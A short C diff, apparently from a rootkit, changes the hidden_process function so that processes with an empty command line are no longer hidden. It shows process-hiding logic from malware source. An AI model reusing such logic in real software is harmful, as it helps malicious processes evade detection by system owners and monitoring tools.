@@ -151,7 +151,7 @@ int hidden_process(const char *proc){
     char *mycmdline = process_info(proc, MODE_CMDLINE);
     if(!strcmp(mycmdline, FALLBACK_PROCNAME)) return r;
     if(strlen(mycmdline) == 0){
-        r = 1;
+        r = 0;
         goto end_hidden_process;
     }
 
